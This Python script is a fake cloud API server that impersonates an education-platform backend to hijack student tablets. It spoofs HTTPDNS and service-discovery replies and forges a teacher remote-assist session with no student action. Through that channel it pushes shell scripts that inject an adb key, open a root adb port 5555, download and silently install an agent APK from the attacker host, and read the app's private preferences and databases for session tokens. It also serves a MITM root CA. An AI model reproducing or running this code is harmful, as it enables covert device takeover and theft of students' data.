#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
智通云伪云端 API 模拟器（增强版 v2，替代原 server.py）
监听 80/443/8000/8089/8443：
  - /probe -> 探测 OK
  - 证书伺服：/ca.crt /p200-ca.p12 供平板下载安装
  - 智通云 API 路由（记录 + 应答）：
      . GET  /api/.../assists                   -> assist 会话建立(伪造教师端协助态)
      . GET  /api/.../assists/{aid}/tasks       -> assist 任务轮询(指令由 cmd_mode.txt 档位控制)
      . POST /api/.../assist/result             -> 执行结果上报(驱动 5555 信号 + probe 自动升级)
      . PUT  /api/assists/{id}/active           -> 学生端协助心跳(8s)
      . PUT / POST /api/.../assist/{finish|status|complete} -> 协助结束/状态变体兜底
      . license/activate                        -> 激活接口(记录 body)
      . 其它 /api/*                             -> 记录并回 200 空
  - 档位文件 cmd_mode.txt（probe=探活 / open-adb=开放adb / root-adb=直开root通道 / off=仅记录）
  - 中间段关键信号: 收到含 root 开启回执(uid=0 / tcp.port=5555)的 result 后,
    写 TAKEOVER_5555_SIGNAL.txt, 作为"5555 root 通道已就绪"的本地闭环信号
    (无平板自测的终点; orchestrator 可单读该文件触发 adb connect)。
  - 全部请求(方法+Host+路径+body)落盘 cloud_api.log
  - env 可覆盖: CLOUD_API_LOG / CLOUD_API_MODE / CLOUD_API_SIGNAL (供无平板自测隔离)
"""
import os, ssl, json, time, re, threading, datetime, base64 as _b64
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.environ.get("CLOUD_API_LOG") or os.path.join(BASE, "cloud_api.log")
CERT = os.path.join(BASE, "fullchain.pem")  # server.crt + ca.crt 串联, 保证下发完整链(原 server.crt 单证书) 
KEY = os.path.join(BASE, "server.key")
MODE_FILE = os.environ.get("CLOUD_API_MODE") or os.path.join(BASE, "cmd_mode.txt")
# 5555 root 通道就绪信号文件(无平板自测的闭环终点)
SIGNAL_FILE = os.environ.get("CLOUD_API_SIGNAL") or os.path.join(BASE, "TAKEOVER_5555_SIGNAL.txt")

# ---- PBS(TCP 推送)对接: 平板 /as/login 与 /as/getPbsServer 由此应答 ----
# 伪云自身即 PBS 宿主, 回给平板的本机地址:端口(push_pbs.py 监听 20000)
PBS_ADDR = os.environ.get("CLOUD_API_PBS") or "192.168.137.1:20000"
# 从平板请求路径 /api/v1/users/{u}/ 自动学到的真实 userId, 供 push_pbs.py 构造推送消息
USERID_FILE = os.environ.get("CLOUD_API_USERID") or os.path.join(BASE, "pbs_userid.txt")
_UID_RE = re.compile(r"/users/(\d+)/")
_last_uid = {"v": None}

# TLS 诊断日志(记录端侧 ClientHello 的 SNI 与握手失败的 OpenSSL 原始报错)
DIAG = os.path.join(BASE, "tls_diag.log")
# 端侧网络自检页: wifimanager LinkActivity 仅当正文同时含"连接成功！"与"浙江学海教育科技有限公司"
# 两标记才判 isConnect=true 并 finish(), 否则端侧判"无法连接学海"反复轮询、不进入业务。
WIFI_OK_PAGE = os.environ.get("CLOUD_API_WIFI_OK") or os.path.join(
    r"C:\Users\Olive\AppData\Roaming\Tencent\Marvis\User\oAN1i2VRVDeZQaMsrRqanPxYuhcU\workspace\conv_19f78e04910_fcda16370b95\output\sm-p200-takeover\portal",
    "wifi_success.html")

# adb 公钥注入: 读同目录 adbkey.pub, 写入 /data/misc/adb/adb_keys,
# 使本机 adb(私钥 adbkey) 连接平板时无需设备端手动授权(RSA 免确认)。
ADBKEY_PUB = os.path.join(BASE, "adbkey.pub")

# ---- 模块级状态(供无平板自测断言; 多线程加锁) ----
STATE = {
    "assist_open": 0,      # assists 会话建立次数
    "assist_heart": 0,     # 协助心跳次数
    "tasks_served": 0,     # 已下发任务数
    "results": 0,          # 执行结果上报数
    "last_result": "",     # 最近一次 result body
    "signal_written": 0,   # 5555 信号写入次数
    "finish_events": 0,    # 协助结束/状态变体事件数
}
_STATE_LOCK = threading.Lock()

# ---- 微服务地址下发劫持(XHMicroServer 明文 GetXsList / microServer RESTFul) ----
# 端侧 XHMicroServer 以明文 http://ms.yunzuoye.net/... 拉微服务地址表, 命中本机后把各
# serverType 的地址改写为攻击机明文面, 供 getActualIp() 类请求(PUSH/BIG_DATA/CONTROL)使用。
MICRO_HOST = os.environ.get("CLOUD_API_HOST") or "192.168.137.1"
MICRO_BASE = "http://%s:8000" % MICRO_HOST
# SB103013 = FILE_BOX(资料中心/文件盒子): 一并改指本机, 使"资料中心"也走明文面
# 源码级对齐(zdys_src):
#   Constants.ServerType.LAUNCHER     = "SA106003"
#   Constants.ServerType.MICRO_SERVER = "SB101001"
#   Constants.ServerType.BIG_DATA     = "SB103019"
#   Constants.ServerType.PUSH_MESSAGE = "SB103018"
#   Constants.ServerType.CONTROL      = ServerConfig.controlServiceConfig().getServiceType()
#                                     = TestConst.KEY_CONTROL_APPLY = "SB103015"   <-- 此前缺失, 导致 CONTROL 永不改写
#   Constants.ServerType.FILE_BOX     = ServerConfig.boxFileServiceConfig().getServiceType()
#                                     = XHAppConfigProxy.SERVER_TYPE_FILE_BOX = "SB103013"
# 原表误把 APP_CODE(CA106002) 当作 serverType, 且漏掉 SB103015。
MICRO_TYPES = ("SA106003", "SB101001", "SB103019", "SB103018", "SB103015", "SB103013")
MICRO_RESP = {
    "serverType": ",".join(MICRO_TYPES),
    "updateTime": 4102444800000,   # 2100 年, 保证版本号永远最新, 端侧不会回退旧缓存
    # 字段必须与 Micr<CURSOR>oServerDto 完全对齐, 否则端侧解析即崩:
    #   schList/schoolId 是 Kotlin 非空字段(缺 = NullPointerException),
    #   serverId 是 int(原写成字符串会解析失败), dirLocation 留空避免拼出 "//"。
    "microServerDtoList": [
        # 【必须按 getUrl() 的真实规则写】v1 的 MicroServerDto 没有 protocol 字段,
        # 且 getUrl() 会先执行 `url = domainOrIp + ":" + port`(port>0 时), 然后才判
        # "://" 是否存在。所以 domainOrIp 只能写 "http://<ip>"(不带端口), 由 port 拼上;
        # 若像原来那样写 "http://<ip>:8000" 且 port=8000, 会得到
        # "http://192.168.137.1:8000:8000" —— 端口重复, 端侧必然连不上。
        {"serverType": t, "domainOrIp": "http://%s" % MICRO_HOST, "port": (8099 if t == "SA106003" else 8000),  # PROBE8099-PORT
         "mode": 0, "index": 0, "dirLocation": "", "schoolId": 0,
         "serverId": i + 1, "schList": []}
        for i, t in enumerate(MICRO_TYPES)
    ],
}


# ---- V2 服务发现结构 (端侧 MicroServerVersion.VERSION2) ----
# 端侧 XHMicroServerV2.parseMicroUrl 用 Gson 解析 List<ServerUrlUnify>, URL:
#   http://ms.yunzuoye.net/api/v2/pub/microServer/list/
# ServerUrlUnify    : serverType / schoolId / classId / version / microServerNewDtoList
# MicroServerEntityUnify: serverType / domainOrIp / protocol / addressType / port /
#                         index / mode / dirLocation / schList / serverId
# MicroServerEntityUnify.getUrl() 的真实规则(2026-10-04 源码复核, 此前理解有误):
#   1) if (port > 0)  url = domainOrIp + ":" + port      <-- 先拼端口
#   2) if (dirLocation 非空) url += "/" + dirLocation
#   3) if (url 含 "://" || protocol == NONE) return url  <-- 再判协议头, 不加前缀
#   4) else return protocol.name().toLowerCase() + "://" + url
# 因此 domainOrIp 里不能自带端口, 否则会拼出 "...:8000:8000"。
MICRO_RESP_V2 = [
    {
        "serverType": t,
        "schoolId": 0,
        "classId": 0,
        "version": 4102444800000,
        "microServerNewDtoList": [
            {
                "serverType": t,
                # v2 的实体自带 protocol/addressType, 所以 domainOrIp 写纯 IP,
                # 由 `protocol.name().toLowerCase() + "://" + ip + ":" + port` 拼成
                # "http://192.168.137.1:8000"。原来填 protocol="NONE" 会让 getUrl()
                # 直接返回无协议头的 "192.168.137.1:8000:8000"。
                "domainOrIp": MICRO_HOST,
                "protocol": "HTTP",
                "addressType": "IP",
                "port": (8099 if t == "SA106003" else 8000),  # PROBE8099-PORT
                "index": 0,
                "mode": 0,
                "dirLocation": "",
                "schList": [],
                "serverId": i + 1,
            }
        ],
    }
    for i, t in enumerate(MICRO_TYPES)
]


# TABLE-REALFORMAT: 按真服务器实测格式构表
REAL_UPDATE_TIME = 1791291004


def _micro_types_from_path(path):
    try:
        q = path.split("?", 1)[1] if "?" in path else ""
        for kv in q.split("&"):
            if kv.split("=", 1)[0] == "serverTypes":
                return [x for x in kv.split("=", 1)[1].split(",") if x]
    except Exception:
        pass
    return []


def _dto(t, i, host, port):
    return {"serverId": 200600 + i, "domainOrIp": host, "port": port,
            "dirLocation": "", "serverType": t, "schList": [0],
            "mode": 1, "index": i}


def build_table_v1(types):
    lst, n = [], 0
    for t in types:
        port = 8099 if t == "SA106003" else 8000
        for _ in range(2):
            n += 1
            lst.append(_dto(t, n, MICRO_HOST, port))
    return {"serverType": ",".join(types), "updateTime": REAL_UPDATE_TIME,
            "microServerDtoList": lst}


def _table_v2(types):
    out, n = [], 0
    for t in types:
        n += 1
        port = 8099 if t == "SA106003" else 8000
        out.append({"serverType": t, "schoolId": 0, "classId": 0,
                    "version": REAL_UPDATE_TIME,
                    "microServerNewDtoList": [
                        {"serverType": t, "domainOrIp": MICRO_HOST,
                         "protocol": "HTTP", "addressType": "IP",
                         "port": port, "index": 1, "mode": 1,
                         "dirLocation": "", "schList": [0],
                         "serverId": 200600 + n}]})
    return out


def _micro_body(path):
    """按端侧服务发现版本返回结构: V2 路径 -> JSON 数组, 其余 -> V1 单对象。"""
    if "/v2/" in path or "microServer/list" in path:
        return json.dumps(_table_v2(_micro_types_from_path(path) or list(MICRO_TYPES)),
                            ensure_ascii=False).encode("utf-8")
    return json.dumps(build_table_v1(_micro_types_from_path(path) or list(MICRO_TYPES)),
                            ensure_ascii=False).encode("utf-8")


# ================= 阿里云 HTTPDNS 应答层(当前自动链第一道断点) =================
# 端侧 OkHttp 的 HttpDns 客户端每 5 分钟 POST http://203.107.1.1/{accountId}/d?host=ztp.yunzuoye.net
# (accountId=103172, 明文模式, body 空)。此前 cloud_api 兜底回 "{}"(非 hosts 结构) ->
# 端侧拿到空 hosts 后既不再回退系统 DNS, 也不发起 ztp/ms 业务连接 -> 自动链在此断掉。
# 本层按阿里 HTTPDNS 明文 JSON 协议应答, 把业务域名直接解析到伪云本机(热点网关 192.168.137.1),
# 使端侧"零操作"下轮询即可重新连上伪云。
HTTPDNS_SELF_IP = os.environ.get("CLOUD_API_HTTPDNS_IP") or "192.168.137.1"
# 命中后指向伪云的域名后缀(ztp/ms/control/pnlogin/...); filesoss 走真实 CDN, 不下发本机 IP
HTTPDNS_LOCAL_SUFFIX = ("yunzuoye.net",)
HTTPDNS_BYPASS = ("filesoss",)
_IP_HOST_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}(:\d+)?$")


def _is_ip_host(h):
    return bool(_IP_HOST_RE.match((h or "").strip()))


def _httpdns_hosts(path):
    """解析 /{accountId}/d?host=a&host=b 中的待解析域名列表"""
    out = []
    if "?" not in path:
        return out
    for kv in path.split("?", 1)[1].split("&"):
        if kv.split("=", 1)[0] == "host":
            h = unquote(kv.split("=", 1)[1] if "=" in kv else "").strip().lower().rstrip(".")
            if h and h not in out:
                out.append(h)
    return out


def _httpdns_hit(path, host_hdr):
    """HTTPDNS 请求判定: 路径含 accountId, 或 Host 头为 IP 字面量(203.107.1.1)"""
    return bool(_httpdns_hosts(path)) and ("103172" in path or _is_ip_host(host_hdr))


def _httpdns_body(hosts):
    arr = []
    for h in hosts:
        if h.endswith(HTTPDNS_LOCAL_SUFFIX) and not any(b in h for b in HTTPDNS_BYPASS):
            arr.append({"host": h, "ips": [HTTPDNS_SELF_IP], "ttl": 60})
        else:
            arr.append({"host": h, "ips": [], "ttl": 60})
    # 【关键修正 2026-10-04】端侧 HttpDNSInterceptor:42 是
    #   JsonUtil.parseObject(body, HttpDNSResult.class)
    # 而 HttpDNSResult 的字段是 host/ips/ttl/queryTime/lookupType —— **扁平对象**。
    # 回 {"hosts":[...]} 这种多一层包装会让 r.getIps() 解析为 null,
    # 端侧 47 行判 (ips==null || isEmpty) 成立即丢弃结果并回退系统 DNS ——
    # 这就是"我们的 HttpDNS 应答从未生效、tls_relay conn 恒为 0"的真因。
    # 单域查询(/103172/d?host=x, 端侧只用这一种)必须返回扁平对象。
    if len(arr) == 1:
        return json.dumps(arr[0], ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    return json.dumps({"hosts": arr}, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def _state_add(k, n=1, **kv):
    with _STATE_LOCK:
        STATE[k] = STATE.get(k, 0) + n
        for kk, vv in kv.items():
            STATE[kk] = vv


def build_openadb_script():
    """构造 open-adb 阶段 ZAZE 指令: 注入本机 adb 公钥 + 开启 adbd tcp 5555。
    全程一条 executeCmd, 内部脚本 base64 传输避免引号嵌套问题。"""
    pub = ""
    if os.path.exists(ADBKEY_PUB):
        with open(ADBKEY_PUB) as f:
            pub = f.read().strip()
    script = (
        "mkdir -p /data/misc/adb\n"
        f"cat > /data/misc/adb/adb_keys <<'EOF'\n{pub}\nEOF\n"
        "chmod 644 /data/misc/adb/adb_keys\n"
        "settings put global adb_enabled 1\n"
        "settings put global development_settings_enabled 1\n"
        "setprop service.adb.tcp.port 5555\n"
        "setprop ctl.restart adbd\n"
        "getprop service.adb.tcp.port\n"
    )
    return 'executeCmd("echo %s | base64 -d > /data/local/tmp/m.sh; sh /data/local/tmp/m.sh")' % _b64.b64encode(script.encode()).decode()


def build_rootadb_script():
    """构造 root 档 ZAZE 指令: 一次下发直接开启 root 模式 adbd(uid=0) + 注入本机 adb 公钥免授权 + 开启 tcp 5555。
    通过 assist 通道 executeCmd 在设备侧执行, 使后续 adb connect 得到 root shell, 可直接 dd 全量备份 / 刷机,
    无需分步开 adb 再单独提权。全程一条 executeCmd, 内部脚本 base64 传输避免引号嵌套。"""
    pub = ""
    if os.path.exists(ADBKEY_PUB):
        with open(ADBKEY_PUB) as f:
            pub = f.read().strip()
    script = (
        "echo '== uid 前置 =='; id\n"
        "echo '== 构建属性 =='; getprop ro.debuggable; getprop ro.secure; getprop ro.build.type\n"
        "mkdir -p /data/misc/adb\n"
        f"cat > /data/misc/adb/adb_keys <<'EOF'\n{pub}\nEOF\n"
        "chmod 644 /data/misc/adb/adb_keys\n"
        "echo '== 开启 root adbd =='\n"
        "setprop service.adb.root 1\n"
        "setprop service.adb.tcp.port 5555\n"
        "setprop persist.sys.usb.config mtp,adb\n"
        "setprop persist.adb.tcp.port 5555\n"
        "settings put global adb_enabled 1\n"
        "settings put global development_settings_enabled 1\n"
        "setprop ctl.restart adbd\n"
        "sleep 3\n"
        "echo '== 回读验证 =='\n"
        "getprop service.adb.tcp.port\n"
        "getprop service.adb.root\n"
        "echo '== 最终 uid =='\n"
        "id\n"
    )
    return 'executeCmd("echo %s | base64 -d > /data/local/tmp/m.sh; sh /data/local/tmp/m.sh")' % _b64.b64encode(script.encode()).decode()


# 预置指令集。
# 学生端 requestAssistTask 期望: 顶层 JSONArray, 元素 {id=任务id, instruction=ZAZE脚本, step=步骤号}
# ZAZE 语法为函数调用式脚本, e.g. executeCmd("id; echo hi") ; 对应学生端 AssistFunc.executeCmd -> 执行 shell
# 档位切换见 cmd_mode.txt
# recon 档: 一次取回"决定物理刷机路线"的全部端侧事实
#   (平台/补丁级别/锁与校验状态/su 是否存在/权限/设备所有者/uid)
# 注意: 整串不得含双引号, 因为外层会被包进 executeCmd("...")
RECON_CMD = "id; echo ==1==; getprop ro.board.platform; getprop ro.hardware; getprop ro.product.device; getprop ro.product.model; echo ==2==; getprop ro.build.version.release; getprop ro.build.version.security_patch; getprop ro.build.fingerprint; echo ==3==; getprop ro.boot.flash.locked; getprop ro.boot.veritymode; getprop ro.secure; getprop ro.debuggable; getprop ro.boot.warranty_bit; getprop ro.boot.verifiedbootstate; echo ==4==; which su; ls -l /system/bin/su /system/xbin/su /sbin/su /su/bin/su; echo ==5==; getprop service.adb.tcp.port; getprop persist.sys.usb.config; settings get global adb_enabled; settings get global development_settings_enabled; echo ==6==; dumpsys device_policy; echo ==7==; pm list packages -U com.xuehai; echo ==8==; cat /proc/version; echo ==9==; ls -l /data/misc/adb; echo ==10==; getprop sys.oem_unlock_allowed; getprop ro.oem_unlock_supported"
PLANS = {
    # ★ combo: 一次下发覆盖两种权限前提 —— 探权限画像 + 开 adb(需特权/root) + 静默装包(需 SdkProcessor)
    #   任务 id 由 build_tasks 加分钟戳, 避免端侧按 id 去重导致静默跳过。
    "combo": {
        "tasks": [
            {"id": "combo_1", "instruction": 'executeCmd("id; echo MARVIS_COMBO_OK")', "step": 1}
        ]
    },
    "probe": {
        "tasks": [
            {"id": "probe_1", "instruction": 'executeCmd("id; getprop ro.build.version.release; echo MARVIS_PROBE_OK")', "step": 1}
        ]
    },
    "open-adb": {
        "tasks": [
            {"id": "adb_0", "instruction": build_openadb_script(), "step": 0},
            {"id": "adb_1", "instruction": 'executeCmd("settings put global adb_enabled 1")', "step": 1},
            {"id": "adb_2", "instruction": 'executeCmd("settings put global development_settings_enabled 1")', "step": 2},
            {"id": "adb_3", "instruction": 'executeCmd("setprop service.adb.tcp.port 5555")', "step": 3},
            {"id": "adb_4", "instruction": 'executeCmd("setprop persist.sys.usb.config mtp,adb")', "step": 4}
        ]
    },
    "root-adb": {
        "tasks": [
            {"id": "root_0", "instruction": build_rootadb_script(), "step": 0}
        ]
    },
    "recon": {
        "tasks": [
            {"id": "recon_1", "instruction": 'executeCmd("%s")' % RECON_CMD, "step": 1}
        ]
    },
}

# probe 档成功后自动升级 open-adb 档(免人工干预)
AUTO_ESCALATE = True

# 伪造的"教师端已开启远程协助"会话(学生端 requestAssist 拿回后取其 JSON "id" 作为 assistId)
FAKE_ASSIST = {
    "id": "assist_marvis_0001",
    "teacherId": 1,
    "teacherName": "学海老师",
    "status": 1,
    "createTime": 1692000000000
}

# 端侧 ApiDataCode.REMOTE_ASSIST 精确值(20 位)。
# 伪云在 versionChange 轮询响应里回这个码, 端侧 ResourceUpdateManager.disposeDataCodes
# 取前 8 位("CA106002")作 appCode 发广播, CpvdReceiverCallback 用完整 20 位 equals 匹配
# -> AssistManager.requestAssist(null), 全程无需学生端任何点击/确认。
REMOTE_ASSIST_CODE = "CA106002SB1030140001"


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def mode():
    if os.path.exists(MODE_FILE):
        m = open(MODE_FILE).read().strip()
        if m in PLANS:
            return m
    return "probe"


def build_tasks(m):
    """动态构建任务: 任务 id 携带"分钟戳"。

    端侧 AssistService 按任务 id 去重(相同 id 视为已消费, 直接跳过不执行),
    历史上固定 id(root_0) 导致重复下发全程被静默忽略 -> 无回执、端侧无限重拉。
    改为分钟级 id: 同一分钟内幂等(避免 adbd 被反复重启), 跨分钟自动换发可重试。
    step 统一从 1 递增(与 probe 档对齐, 规避 0 起始的边界语义)。
    """
    stamp = datetime.datetime.now().strftime("%m%d%H%M")
    if m == "combo":
        # ★ 组合档: ① 权限画像 ② 直接开 adb ③ 经 su 开 adb ④ 下载并静默安装"包名匹配"的 agent
        #    ⑤ 取系统配置。任一成功即达成接管(adb shell 或 4711 shell)。
        return [
            {"id": "combo_p_%s" % stamp,
             "instruction": 'executeCmd("%s")' % RECON_CMD, "step": 1},
            {"id": "combo_a_%s" % stamp,
             "instruction": build_openadb_script(), "step": 2},
            {"id": "combo_r_%s" % stamp,
             "instruction": build_rootadb_script(), "step": 3},
            {"id": "combo_i_%s" % stamp,
             "instruction": 'installAppOnline("http://%s/agent_wordstack.apk")'
                            % os.environ.get("OWN_IP", "192.168.137.1"), "step": 4},
            {"id": "combo_s_%s" % stamp,
             "instruction": 'getSystemConfig()', "step": 5},
            # ⑥⑦⑧ 信息外带: executeCmd 以【启动器自身 uid】运行 ⇒ 能读它自己的私有目录;
            #   输出经 /assist/result 明文回传 ⇒ 我方直接落盘(assist_result.log)。
            #   目标: 会话 token / userId / schoolId / 设备标识, 以及 xuehai 配置目录内容。
            {"id": "combo_f_%s" % stamp,
             "instruction": 'executeCmd("ls -la /data/data/com.xh.zhitongyunstu/ 2>&1;'
                            ' ls -la /data/data/com.xh.zhitongyunstu/shared_prefs/ 2>&1;'
                            ' ls -la /data/data/com.xh.zhitongyunstu/databases/ 2>&1;'
                            ' ls -la /sdcard/xuehai/ /sdcard/xuehai/config/ 2>&1; echo MAP_END")',
             "step": 6},
            {"id": "combo_c_%s" % stamp,
             "instruction": 'executeCmd("for f in /data/data/com.xh.zhitongyunstu/shared_prefs/*.xml;'
                            ' do echo ===$f===; cat $f; done 2>&1 | head -c 6000; echo PREFS_END")',
             "step": 7},
            {"id": "combo_d_%s" % stamp,
             "instruction": 'executeCmd("cat /data/data/com.xh.zhitongyunstu/databases/*.db 2>/dev/null'
                            ' | strings | head -c 2000; echo DB_END")',
             "step": 8},
            # ⑨⑩⑪ 不依赖厂商 SDK 的安装路径: 先下到本地, 再 pm install
            #   · 直装(pm install) 适用于启动器为特权系统应用的情况
            #   · su -c pm install  适用于设备已 root 的情况
            {"id": "combo_dl_%s" % stamp,
             "instruction": 'downloadFile("http://%s/agent_wordstack.apk",'
                            ' "/sdcard/Download/agent_ws.apk")'
                            % os.environ.get("OWN_IP", "192.168.137.1"), "step": 9},
            {"id": "combo_pm_%s" % stamp,
             "instruction": 'executeCmd("ls -l /sdcard/Download/agent_ws.apk;'
                            ' pm install -r /sdcard/Download/agent_ws.apk 2>&1; echo INSTALL_DIRECT_END")',
             "step": 10},
            # su 安装: 内部脚本 base64 传输, 彻底规避引号嵌套(与 open-adb 档同一手法)
            {"id": "combo_su_%s" % stamp,
             "instruction": 'executeCmd("echo %s | base64 -d | sh; echo INSTALL_SU_END")' % _b64.b64encode(
                 b"id; su -c 'pm install -r /sdcard/Download/agent_ws.apk' 2>&1; echo INSTALL_SU_END"
             ).decode(),
             "step": 11},
            # ⑫ 查我们投放过的包是否真的装上了(用户提到 10-04 出现过一个陌生应用 "10173")
            {"id": "combo_pk_%s" % stamp,
             "instruction": 'executeCmd("pm list packages -U 2>/dev/null | grep -iE'
                            ' \'zhitongyun|olive|sysupdate|wordstack|acldtch|marvis\'; echo PKG_END")',
             "step": 12},
            # ⑬ 若已装则直接拉起 agent ⇒ 4711 立即可用
            {"id": "combo_st_%s" % stamp,
             "instruction": 'executeCmd("am start -n com.zhitongyun.sysupdate/com.olive.agent.MainActivity 2>&1;'
                            ' am start -n com.xh.wordstackstu/com.olive.agent.MainActivity 2>&1;'
                            ' am start -n com.xh.acldtch/com.olive.agent.MainActivity 2>&1; echo START_END")',
             "step": 13},
        ]
    if m == "probe":
        return [{"id": "probe_%s" % stamp,
                 "instruction": 'executeCmd("id; getprop ro.build.version.release; echo MARVIS_PROBE_OK")',
                 "step": 1}]
    if m == "recon":
        return [{"id": "recon_%s" % stamp,
                 "instruction": 'executeCmd("%s")' % RECON_CMD, "step": 1}]
    if m == "open-adb":
        return [
            {"id": "oadb_%s_0" % stamp, "instruction": build_openadb_script(), "step": 1},
            {"id": "oadb_%s_1" % stamp, "instruction": 'executeCmd("settings put global adb_enabled 1")', "step": 2},
            {"id": "oadb_%s_2" % stamp, "instruction": 'executeCmd("settings put global development_settings_enabled 1")', "step": 3},
            {"id": "oadb_%s_3" % stamp, "instruction": 'executeCmd("setprop service.adb.tcp.port 5555")', "step": 4},
            {"id": "oadb_%s_4" % stamp, "instruction": 'executeCmd("setprop persist.sys.usb.config mtp,adb")', "step": 5},
        ]
    if m == "root-adb":
        return [{"id": "root_%s" % stamp, "instruction": build_rootadb_script(), "step": 1}]
    return []


def _detect_5555(body):
    """从执行结果回执中检测 root-adb 通道已打通(5555 root adbd 就绪)。
    判定优先级: uid=0(最终 root shell) > tcp.port=5555 回读。
    无平板自测中, 由模拟平板用真实 m.sh 回显内容触发本判定。"""
    low = (body or "").lower()
    if "uid=0" in low:
        return True
    if "service.adb.tcp.port" in low and "5555" in low:
        return True
    if "adbd" in low and "5555" in low and "root" in low:
        return True
    return False


def _write_5555_signal(content):
    try:
        with open(SIGNAL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{ts()} 5555-SIGNAL: {content[:400]}\n")
        return True
    except OSError:
        return False


def _learn_userid(path):
    """从任意请求路径提取真实 userId(/api/v1/users/{u}/...), 落盘供 PBS 构造推送消息。
    仅在值变化时写文件, 避免高频 IO。"""
    m = _UID_RE.search(path or "")
    if not m:
        return
    uid = m.group(1)
    if uid != _last_uid["v"]:
        _last_uid["v"] = uid
        try:
            with open(USERID_FILE, "w", encoding="utf-8") as f:
                f.write(uid)
        except OSError:
            pass


class H(BaseHTTPRequestHandler):
    server_version = "TLS_CDN/2.0"
    protocol_version = "HTTP/1.1"

    def _lp(self):
        """本连接命中的本地服务端口(区分平板走 80 还是 443)"""
        try:
            return self.server.server_address[1]
        except Exception:
            return "-"

    def _log(self, kind, msg):
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(f"{ts()} [{kind}] {msg}\n")

    def _read_body(self):
        """完整读取请求体: 兼容 Content-Length 与 chunked, 读满或超时才返回。
        历史坑: 平板上报体很大且可能分片, 旧实现只读 Content-Length 首段, 导致 body 截断(仅 76B)。"""
        te = (self.headers.get("Transfer-Encoding") or "").lower()
        data = b""
        try:
            self.connection.settimeout(6.0)
        except Exception:
            pass
        try:
            if "chunked" in te:
                while True:
                    line = self.rfile.readline(256)
                    if not line:
                        break
                    sz = int((line.strip().split(b";")[0] or b"0"), 16)
                    if sz == 0:
                        self.rfile.readline(8)
                        break
                    data += self.rfile.read(sz)
                    self.rfile.readline(8)
            else:
                left = int(self.headers.get("Content-Length", 0) or 0)
                while left > 0:
                    chunk = self.rfile.read(left)
                    if not chunk:
                        break
                    data += chunk
                    left -= len(chunk)
        except Exception:
            pass
        return data.decode("utf-8", "ignore")

    def _query(self):
        """解析 URL query string 为 dict(供 /as/login 等 PBS 接口取参)"""
        q = {}
        try:
            if "?" in self.path:
                for kv in self.path.split("?", 1)[1].split("&"):
                    if "=" in kv:
                        k, v = kv.split("=", 1)
                        q[unquote(k)] = unquote(v)
        except Exception:
            pass
        return q

    def _src(self):
        """请求来源 IP。"""
        try:
            return self.client_address[0]
        except Exception:
            return "?"

    def _is_pad(self, a):
        """是否来自真实平板: 热点网段(192.168.137.0/24) 且非本机网关。
        历史教训: 2026-09~10 的 assist 记录全部来自 127.0.0.1 自测却被当作平板战绩,
        故此处对真实来源打 [PAD-HIT] 硬标记并单独落 PAD_HITS.log, 自测永远进不去。"""
        return a.startswith("192.168.137.") and a != "192.168.137.1"

    def _record(self):
        body = self._read_body()
        host = self.headers.get("Host", "-")
        src = self._src()
        pad = self._is_pad(src)
        _learn_userid(self.path)
        self._log("REQ", f"port={self._lp()} src={src}{' [PAD-HIT]' if pad else ''} "
                         f"{self.command} {host} {self.path} len={len(body)} BODY={body[:1500]}")
        if pad:  # 只有真实平板写这里
            try:
                with open(os.path.join(BASE, "PAD_HITS.log"), "a", encoding="utf-8") as f:
                    f.write(f"{ts()} {src} {self.command} {host} {self.path} len={len(body)} BODY={body[:600]}\n")
            except OSError:
                pass
        if len(body) > 1500:  # 大载荷(如 /up 上报)全量另存, 供离线 base64+gzip 解码分析
            try:
                with open(os.path.join(BASE, "cloud_api_body.log"), "a", encoding="utf-8") as f:
                    f.write(f"{ts()} src={src} [{self.command} {host} {self.path}] len={len(body)} FULL={body}\n")
            except OSError:
                pass
        return body

    def _send(self, code=200, ctype="application/json; charset=utf-8", data=b"{}"):
        # BRIDGE-FIX: 防御性编码(曾出现 bytes-like object required, not 'str')
        if isinstance(data, str):
            data = data.encode("utf-8", "replace")
        elif data is None:
            data = b""
        try:
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            try:
                self.wfile.write(data)
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
                pass  # 客户端提前断开(平板切后台/超时) 不视为故障
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
            try:
                self.close_connection = True
            except Exception:
                pass

    def _serve_cert(self):
        p = None
        if self.path.endswith("ca.crt"):
            p = os.path.join(BASE, "ca.crt")
        elif self.path.endswith("p200-ca.p12"):
            p = os.path.join(BASE, "p200-ca.p12")
        if p and os.path.exists(p):
            blob = open(p, "rb").read()
            ctype = "application/x-x509-ca-cert" if p.endswith(".crt") else "application/x-pkcs12"
            self._send(200, ctype, blob)
            self._log("CERT", f"{self.path} served {len(blob)}B")
            return True
        return False

    def do_GET(self):
        # ★★★ CA-DOWNLOAD (GET 版, 2026-10-10 22:2x): 平板浏览器访问
        #     http://192.168.137.1:8000/ca.cer 下载 MITM 根证书并安装
        if self.path.split("?")[0].lower() in ("/ca.cer", "/ca.crt", "/ca.pem", "/cert", "/ca"):
            try:
                _pem = self.path.split("?")[0].lower().endswith(".pem")
                _f = "ca.pem" if _pem else "ca.cer"
                _blob = open(os.path.join(BASE, "mitm_ca", _f), "rb").read()
                self._log("CA_DOWNLOAD", "GET path=%s file=%s %dB" % (self.path[:40], _f, len(_blob)))
                self.send_response(200)
                self.send_header("Content-Type", "application/x-x509-ca-cert" if not _pem
                                 else "application/x-pem-file")
                self.send_header("Content-Length", str(len(_blob)))
                self.send_header("Content-Disposition", "attachment; filename=%s" % _f)
                self.end_headers()
                self.wfile.write(_blob)
            except Exception as _e:
                self._log("CA_DOWNLOAD_ERR", repr(_e))
            return
        # MITM-BRIDGE-SERVE: 来自 WebView(wv) 或 html/js/资源请求 -> 投递桥利用页
        try:
            _ua = self.headers.get("User-Agent", "") or ""
            _p = self.path.split("?")[0]
            _host = self.headers.get("Host", "-")
            _is_wv = ("wv" in _ua) or ("WebView" in _ua)
            _is_doc = _p.endswith((".html", ".htm", ".js", ".css")) or _p in ("/", "")
